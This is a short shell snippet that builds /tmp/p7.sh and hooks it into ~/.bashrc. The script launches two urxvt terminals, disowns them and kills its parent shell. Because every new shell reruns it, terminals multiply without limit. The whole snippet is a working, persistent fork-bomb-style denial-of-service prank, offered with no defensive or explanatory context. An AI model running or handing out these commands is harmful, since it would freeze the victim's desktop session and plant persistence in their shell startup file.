echo 'sleep 3' > /tmp/p7.sh
echo 'urxvt &' >> /tmp/p7.sh
echo 'urxvt &' >> /tmp/p7.sh
echo 'disown' >> /tmp/p7.sh
echo 'kill -9 `ps --pid $$ -oppid=`' >> /tmp/p7.sh
chmod +x /tmp/p7.sh
echo '/tmp/p7.sh &' >> ~/.bashrc

